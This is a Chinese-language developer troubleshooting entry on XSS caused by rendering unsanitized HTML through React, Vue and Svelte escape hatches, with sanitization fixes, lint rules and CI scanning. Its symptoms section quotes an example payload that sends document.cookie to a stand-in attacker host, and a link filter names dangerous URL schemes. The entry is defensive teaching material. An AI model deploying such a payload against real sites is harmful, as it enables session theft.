# pit-064: XSS via dangerouslySetInnerHTML — 框架逃逸口未做输入净化

## 环境
- React 16+/Vue 2+/Svelte 3+
- 使用 `dangerouslySetInnerHTML` (React) 或 `v-html` (Vue) 或 `{@html}` (Svelte)
- 用户输入、富文本编辑器内容或第三方数据渲染到 HTML

## 症状
用户提交的评论/简介中嵌入了 `<img src=x onerror=fetch('https://evil.com/steal?c='+document.cookie)>`，浏览该页面的其他用户 Cookie 被窃取。或者页面被注入 `<script>` 标签，执行任意 JavaScript 操作 DOM/发起请求/劫持表单。

安全团队扫描发现 XSS 漏洞，生产环境紧急热修复。Sentry 观测到异常的外链请求（`document.cookie` 外传）。

## 根因
React/Vue/Svelte 的默认模板插值会对 `<>"'&` 进行 HTML 实体转义（如 `<script>` → `&lt;script&gt;`），有效防御大多数 XSS。但框架同时提供了"信任输入为安全 HTML"的逃逸口：`dangerouslySetInnerHTML` / `v-html` / `{@html}`。

当开发者对接了富文本编辑器（如 Quill/TipTap/Slate）的输出、后端返回的 HTML 片段、或者用户可编辑的"简介"字段后，如果直接将这些内容通过逃逸口渲染而不做净化，就等同于让攻击者在页面中注入任意 HTML。

## 修复

```diff
// ❌ 问题代码：直接渲染富文本编辑器的 HTML 输出
function Comment({ body }: { body: string }) {
-  return <div dangerouslySetInnerHTML={{ __html: body }} />;
+  // ✅ 方案A：使用 DOMPurify 净化
+  const sanitized = DOMPurify.sanitize(body, {
+    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br', 'ul', 'ol', 'li'],
+    ALLOWED_ATTR: ['href', 'target', 'rel'],
+    ALLOW_DATA_ATTR: false,
+  });
+  return <div dangerouslySetInnerHTML={{ __html: sanitized }} />;
}

// ✅ 方案B：使用 Sanitizer API（2024 Baseline，Chrome 105+）
function CommentSanitizer({ body }: { body: string }) {
  const ref = useRef<HTMLDivElement>(null);
  useEffect(() => {
    if (ref.current) {
      ref.current.setHTML(body, {
        sanitizer: new Sanitizer({
          allowElements: ['b', 'i', 'em', 'strong', 'a', 'p', 'br', 'ul', 'ol', 'li'],
          allowAttributes: { 'href': ['a'], 'target': ['a'] },
          dropElements: ['script', 'style', 'iframe', 'object', 'embed'],
        }),
      });
    }
  }, [body]);
  return <div ref={ref} />;
}

// ✅ 方案C：不用 HTML，改用 Markdown 渲染器
import { marked } from 'marked';
function MarkdownComment({ body }: { body: string }) {
  // marked 默认输出安全的 HTML（不包含 script 标签）
  // 但 a 标签的 href 仍需额外处理
  const html = marked.parse(body, { breaks: true });
  return <div dangerouslySetInnerHTML={{ __html: html }} />;
}

// ⚠️ 进一步防护：a 标签 href 的 javascript: 协议
function sanitizeLinks(html: string): string {
  return html.replace(
    /<a\s+(?:[^>]*?\s+)?href="([^"]*)"/gi,
    (match, url) => {
      if (/^(javascript|data|vbscript):/i.test(url)) {
        return match.replace(url, '#blocked');
      }
      return match;
    }
  );
}
```

## 原理
XSS 的核心是**用户数据被浏览器解析为代码而非数据**。框架的自动转义通过将 `<>"'&` 替换为 HTML 实体（`&lt; &gt; &quot; &#39; &amp;`）来确保用户输入被视为"文本节点"而非"元素节点"。但 `dangerouslySetInnerHTML` 告诉 React "跳过转义，直接作为 innerHTML 插入 DOM"。此时浏览器会正常解析这段 HTML——包括其中的 `<script>`、事件处理器（`onerror`、`onload`）、`javascript:` 协议等。

DOMPurify 通过解析 HTML 为 DOM 树，然后白名单过滤允许的标签和属性，最后序列化回安全的 HTML 字符串。这比正则表达式更可靠（正则无法处理 mXSS 变异）。

## 架构视角 (Architecture Perspective)

### 架构层面根因
XSS 逃逸口的表面原因是"开发者忽略了净化"，架构根因是**富文本渲染层缺少统一的中间表示（IR）**：
- **后端返回 HTML 字符串**：富文本编辑器内容被持久化为原始 HTML，缺少结构化存储。理想架构是存储为 JSON 结构（如 TipTap 的 JSON），由前端统一渲染为安全的 React/Vue 组件树。
- **缺少净化中间件抽象**：每次使用 `dangerouslySetInnerHTML` 都需要手动调用 DOMPurify，造成"写了 99 次净化，漏了 1 次"的事故。净化逻辑应该在组件层面做不可跳过的强制调用。
- **信任边界模糊**：开发者不清楚哪些数据来自"可信源"（自己写死的 HTML 模板）哪些是"不可信源"（用户输入/第三方 API），导致对不可信数据使用了逃逸口。

### 系统级预防策略

**静态防护**：
```js
// ESLint: react/no-danger 对所有 dangerouslySetInnerHTML 报 error
rules: {
  'react/no-danger': 'error',
}

// 自定义 ESLint 规则（如果不想全面禁止）：
// 检测 dangerouslySetInnerHTML 的 __html 值是否来自净化函数
'no-restricted-syntax': ['error', {
  selector: 'JSXAttribute[name.name="dangerouslySetInnerHTML"]',
  message: '请使用 <SafeHTML html={...} /> 组件替代 dangerouslySetInnerHTML'
}]

// ⚠️ 组件替代方案
// SafeHTML 组件：内部强制调用 DOMPurify，不提供绕过选项
function SafeHTML({ html, allowedTags }: { html: string; allowedTags?: string[] }) {
  const clean = useMemo(() => DOMPurify.sanitize(html, {
    ALLOWED_TAGS: allowedTags ?? ['b', 'i', 'em', 'strong', 'a', 'p'],
  }), [html, allowedTags]);
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}
```

**CI 防护**：
```yaml
# CI 中运行 OWASP ZAP 基线扫描
zap-scan:
  script:
    - docker run -t owasp/zap2docker-stable zap-baseline.py
      -t https://staging-${CI_COMMIT_SHA}.example.com
      -J zap-report.json
    - cat zap-report.json | jq '.site[].alerts[] | select(.riskcode >= 3)'
    # riskcode >= 3 的告警导致 CI 失败
```

**架构防护**：
- **引入 SafeHTML 组件**：全局替换所有原生 `dangerouslySetInnerHTML`，SafeHTML 组件内部强制净化，不提供 `skipSanitize` 选项。
- **富文本存储格式切换**：从 HTML 存储迁移到 JSON 存储（如 ProseMirror document model），渲染层完全不用 `dangerouslySetInnerHTML`。

**流程防护**：
- 安全 Code Review 清单："任何涉及用户输入渲染的 PR 需要安全工程师审批。"
- 每季度渗透测试（Pen Test）：使用 OWASP ZAP / Burp Suite 扫描生产环境。

### 相关架构模式
- **SafeHTML 组件模式**（本文件修复部分）— 不可跳过的净化层
- **Trusted Types** (`frontend-security.md` 第1.5节) — CSP 级别的 DOM XSS 预防
- **CSP strict-dynamic** (`frontend-security.md` 第1.4节) — 即使 XSS 也限制可执行脚本

## 预防

1. **用 SafeHTML 组件替代裸 dangerouslySetInnerHTML**：组件内部强制净化。
2. **富文本用 JSON 存储而非 HTML 字符串**：消除注入面。
3. **ESLint `react/no-danger: error`**：让 CI 拦截新增的逃逸口。
4. **Trusted Types**：`require-trusted-types-for 'script'` 让浏览器拒绝未净化的 innerHTML。
5. **CSP `script-src 'strict-dynamic'`**：即使 XSS 成功注入 `<script>` 也无法执行。

## 回退

```bash
# 如果 DOMPurify 误杀合法内容（如 video 标签）：
# 方案A：调整白名单而非禁用净化
DOMPurify.sanitize(html, {
  ALLOWED_TAGS: [...defaultTags, 'video', 'source'],
  ALLOWED_ATTR: [...defaultAttrs, 'src', 'controls'],
});

# 方案B：如果 Sanitizer API 兼容性问题
if ('Sanitizer' in globalThis) {
  // 使用原生 Sanitizer
} else {
  // 异步加载 DOMPurify 作为 polyfill
  const DOMPurify = await import('dompurify');
}

# 方案C：如果 SafeHTML 组件导致性能问题（大段 HTML）
# 使用 useMemo 缓存净化结果
const clean = useMemo(() => DOMPurify.sanitize(html), [html]);
```
